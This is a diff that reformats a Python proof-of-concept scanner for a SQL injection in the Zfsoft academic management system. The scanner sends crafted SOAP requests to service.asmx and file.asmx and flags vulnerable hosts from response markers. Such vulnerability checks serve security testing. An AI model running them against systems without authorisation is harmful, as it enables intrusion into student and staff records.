@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urlparse, httplib
+import urlparse
+import httplib
+
 
 class Vuln(ABVuln):
-    vuln_id = 'Zfsoft_0001' # 平台漏洞编号，留空
+    vuln_id = 'Zfsoft_0001'  # 平台漏洞编号，留空
     name = '正方教务管理系统 SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-24'  # 漏洞公布时间
     desc = '''
         正方教务管理系统
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '正方教务管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ff9845e8-189b-4e24-97f0-fa4fa7bd7e77'
@@ -31,11 +34,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0122523
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0122523
             arr = urlparse.urlparse(self.target)
             hh = hackhttp.hackhttp()
-            raw1='''
+            raw1 = '''
 POST /service.asmx HTTP/1.1
 Host: %s
 Content-Type: text/xml; charset=utf-8
@@ -52,7 +55,7 @@ SOAPAction: "http://www.zf_webservice.com/GetStuCheckinInfo "
     </q1:GetStuCheckinInfo>
   </soap:Body>
 </soap:Envelope>''' % arr.netloc
-            raw2='''POST /file.asmx HTTP/1.1
+            raw2 = '''POST /file.asmx HTTP/1.1
 Host: %s
 Content-Type: text/xml; charset=utf-8
 Content-Length: length
@@ -66,7 +69,7 @@ SOAPAction: "http://zfsoft/zfjw/file/checkFile"
     </checkFile>
   </soap:Body>
 </soap:Envelope>''' % arr.netloc
-            raw3='''POST /service.asmx HTTP/1.1
+            raw3 = '''POST /service.asmx HTTP/1.1
 Host: %s
 Content-Type: text/xml; charset=utf-8
 Content-Length: 795
@@ -87,9 +90,9 @@ SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"
             url1 = self.target + '/service.asmx'
             url2 = self.target + '/file.asmx'
             url3 = self.target + '/service.asmx'
-            code1, head1,res1, errcode1, _ = hh.http(url1, raw=raw1)
-            code2, head2,res2, errcode2, _ = hh.http(url2, raw=raw2)
-            code3, head3,res3, errcode3, _ = hh.http(url3, raw=raw3)
+            code1, head1, res1, errcode1, _ = hh.http(url1, raw=raw1)
+            code2, head2, res2, errcode2, _ = hh.http(url2, raw=raw2)
+            code3, head3, res3, errcode3, _ = hh.http(url3, raw=raw3)
             if code1 == 200 and 'testvul' in res1:
                 #security_hole("GetStuCheckinInfo injection  %s" % target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -103,14 +106,14 @@ SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"
             if code3 == 200 and "type=\"xsd:int\">5</BMCheckPasswordResult><xh xsi:type=\"xsd:string\">jwc01</xh>" in res3:
                 #security_hole('BMCheckPassword inject %s' % target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name)) 
-                
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
